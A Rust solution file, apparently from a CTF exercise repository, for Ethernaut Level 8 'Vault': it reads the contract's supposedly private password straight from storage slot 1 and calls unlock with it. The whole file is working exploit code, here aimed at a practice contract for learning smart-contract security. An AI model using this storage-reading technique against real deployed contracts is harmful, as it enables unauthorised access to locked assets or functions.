use async_trait::async_trait;
use ctf::ethernaut::lvl08_vault::*;
use ethers::{prelude::*, providers::Middleware};

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 8: Vault
     *
     * Unlock the vault to pass the level!
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Vault::new(target.address, offender.clone());
        let mut array: [u8; 32] = [0; 32];
        array[31] = 1;
        let wheres = TxHash::from(array);
        println!("wheres: {}", wheres);
        println!("array: {:?}", array);
        let password =
            offender.get_storage_at(contract.address(), wheres, None).await?;
        println!("password: {}", password);
        println!("ass: {:?}", *password.as_fixed_bytes());
        contract.unlock(*password.as_fixed_bytes()).send().await?;
        Ok(())
    }
}
